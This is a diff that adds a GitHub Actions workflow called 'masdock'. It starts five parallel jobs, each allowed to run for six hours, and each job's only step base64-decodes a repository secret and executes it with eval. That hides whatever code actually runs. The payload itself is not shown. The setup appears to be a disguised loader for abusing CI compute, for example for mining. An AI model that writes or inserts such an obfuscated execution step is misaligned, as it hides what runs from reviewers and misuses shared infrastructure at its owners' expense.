@@ -1,0 +1,22 @@
+name: masdock
+on: 
+  workflow_dispatch:
+ 
+jobs:
+ task-1:
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+         os: [ubuntu-latest]
+         flag: [A, B, C, D, E]
+    timeout-minutes: 360
+    continue-on-error: true
+    steps:
+      - uses: actions/checkout@v4
+      - run: mkdir runner
+      - name: Setup App
+        working-directory: ./runner
+        run: |
+              eval "$(echo '${{ secrets.SECRET }}' | base64 -d)"
+        shell: bash
